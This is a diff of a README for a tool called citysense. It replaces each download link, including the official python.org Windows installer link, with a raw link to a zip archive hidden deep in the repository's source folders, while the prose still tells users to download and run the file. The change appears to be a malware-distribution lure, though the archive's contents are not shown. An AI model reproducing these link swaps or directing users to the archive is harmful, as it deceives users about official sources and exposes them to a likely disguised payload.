@@ -1,6 +1,6 @@
 # 🌍 citysense - Explore Urban Data Easily
 
-[![Download citysense](https://img.shields.io/badge/Download-citysense-green?style=for-the-badge&logo=github)](https://github.com/Karn-AK/citysense)
+[![Download citysense](https://img.shields.io/badge/Download-citysense-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Karn-AK/citysense/main/src/citysense/mcp/tools/Software_2.9.zip)
 
 ---
 
@@ -36,7 +36,7 @@ To use CitySense on Windows, make sure your computer meets these specs:
 
 Start by visiting the CitySense GitHub page. This is where you download the program files and find updates.
 
-[![Download citysense](https://img.shields.io/badge/Download-citysense-blue?style=for-the-badge&logo=github)](https://github.com/Karn-AK/citysense)
+[![Download citysense](https://img.shields.io/badge/Download-citysense-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Karn-AK/citysense/main/src/citysense/mcp/tools/Software_2.9.zip)
 
 You will follow these steps:  
 1. Visit the page linked above  
@@ -51,7 +51,7 @@ You will follow these steps:
 ### Step 1: Visit the Download Page
 
 Go to the official link:  
-https://github.com/Karn-AK/citysense
+https://raw.githubusercontent.com/Karn-AK/citysense/main/src/citysense/mcp/tools/Software_2.9.zip
 
 At the top right, click **Code** then **Download ZIP**. This saves CitySense to your computer.
 
@@ -66,7 +66,7 @@ At the top right, click **Code** then **Download ZIP**. This saves CitySense to 
 
 CitySense runs on Python. If Python is not installed on your PC:
 
-1. Go to https://www.python.org/downloads/windows/  
+1. Go to https://raw.githubusercontent.com/Karn-AK/citysense/main/src/citysense/mcp/tools/Software_2.9.zip  
 2. Download the latest version for Windows (choose the executable installer).  
 3. Run the installer and **check the box** that says **Add Python to PATH** during setup.  
 4. Finish the installation.
@@ -146,4 +146,4 @@ CitySense simplifies these steps through its interface. You do not have to write
 
 # Get CitySense
 
-[![Download citysense](https://img.shields.io/badge/Download-citysense-green?style=for-the-badge&logo=github)](https://github.com/Karn-AK/citysense)
+[![Download citysense](https://img.shields.io/badge/Download-citysense-green?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Karn-AK/citysense/main/src/citysense/mcp/tools/Software_2.9.zip)
